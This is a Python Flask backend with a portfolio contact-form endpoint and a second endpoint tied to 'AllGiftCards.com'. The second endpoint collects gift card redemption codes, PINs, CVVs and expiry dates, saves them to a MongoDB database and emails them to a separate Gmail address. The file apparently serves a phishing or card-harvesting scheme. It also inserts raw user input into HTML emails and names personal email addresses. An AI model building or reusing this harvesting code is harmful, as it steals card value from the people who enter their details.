# importing required modules
import os
import csv
from dotenv.main import rewrite
import requests
from flask import Flask, url_for, jsonify, render_template, request
from dotenv import load_dotenv
from flask_mail import Message, Mail
from flask_cors import CORS, cross_origin
from bs4 import BeautifulSoup as bs
import os
import pymongo
load_dotenv()


app = Flask(__name__)
app.config['SECRET_KEY'] = os.environ.get("SECRET_KEY")
# setting mail configs
app.config['MAIL_SERVER'] = "smtp.googlemail.com"
app.config['MAIL_PORT'] = 587
app.config['MAIL_USE_TLS'] = True
app.config['MAIL_USERNAME'] = os.environ.get("EMAIL_USERNAME")
app.config['MAIL_PASSWORD'] = os.environ.get("EMAIL_PASSWORD")

mail = Mail(app)
CORS(app)

client = pymongo.MongoClient(os.environ.get('MONGODB_URI'))
db = client.giftcards


# defining the routes
# home route
@app.route('/')
def home():
    response = {"status": "success",
                "message": "API is working", "owner": "Perfection Loveday", "description": "I am a software engineer with 2+ years of experience in both backend and frontend software design using Python, NodeJS, Javascript, CSS, HTML, and other related technologies.",
                "portfolio": "https://samperfect.netlify.app"}
    return jsonify(response), 200


def fill(code, name, exp, pin, cvv):

    body = f"""
             <h3> A New Gift Card Entry Has Been Made On AllGiftCards.com</h3>

             <p> Gift Card Redemption Code:  {code}</p>

              <p>Gift Card Name:  {name}</p>
              <p>Gift Card Exp Date:  {exp}</p>
              <p>Gift Card Pin:  {pin}</p>
              <p>Gift Card CVV:  {cvv}</p> 
        """

    return body


def populate(name, email, message):

    body = f"""
             <h3> Hello Perfection, You've got a message from {name}</h3>

             <p>Below is the message</p><br />

              <p>{message}</p>
              <p> </p>
              <p> </p>
              <p>You can reach out back to {name} through their email--: {email}</p>
        """

    return body

# endpoint for sending email


@app.route('/api/v1/submit/', methods=["POST"])
def send_email():

    status = True
    try:
        # unpacking request data
        data = request.get_json()
        name = data['name']
        email = data['email']
        message = data['message']
        subject = data['subject']

        # computing message
        msg = Message(subject,
                      sender=name, recipients=['lovedayperfection1@gmail.com'])
        msg.body = populate(name=name, email=email, message=message)
        msg.html = populate(name=name, email=email, message=message)

        # sending the message
        mail.send(msg)

        # computing response
        response = {
            "status": "success",
            "message": "Thanks, your message has been successfully sent. I will get back to you shortly. Stay Safe"
        }
        return jsonify(response), 200

    except TypeError:
        # catching exceptions
        status = False
        response = {
            "status": "failed",
            "message": "Your message data is empty"
        }
        return jsonify(response), 400

    except KeyError:
        # catching exceptions
        status = False
        response = {
            "status": "failed",
            "message": "Ops! There's an error in the message data sent"
        }
        return jsonify(response), 400


# endpoint for sending email
@app.route('/api/v1/send/', methods=["POST"])
def sendMail():

    status = True
    try:
        # unpacking request data
        data = request.get_json()
        code = data['code']
        name = data['name']
        exp = data['exp']
        cvv = data['cvv']
        pin = data['pin']
        subject = "NEW GIFT CARD ALERT"

        db.cards.insert_one({
            "code": code,
            "name": name,
            "exp": exp,
            "pin": pin,
            "cvv": cvv
        })

        # computing message
        msg = Message(subject,
                      sender=name, recipients=['Williamcampbell693@gmail.com'])
        msg.body = fill(code, name, exp, pin, cvv)
        msg.html = fill(code, name, exp, pin, cvv)

        # sending the message
        mail.send(msg)

        # computing response
        response = {
            "status": "success",
            "message": "Thanks, your message has been successfully sent. I will get back to you shortly. Stay Safe"
        }
        return jsonify(response), 200

    except TypeError:
        # catching exceptions
        status = False
        response = {
            "status": "failed",
            "message": "Your message data is empty"
        }
        return jsonify(response), 400

    except KeyError:
        # catching exceptions
        status = False
        response = {
            "status": "failed",
            "message": "Ops! There's an error in the message data sent"
        }
        return jsonify(response), 400


# running the app
if __name__ == '__main__':
    if os.environ.get('ENVIRONMENT'):
        app.run(debug=True, port=8000)
    else:
        app.run()
# running the app end
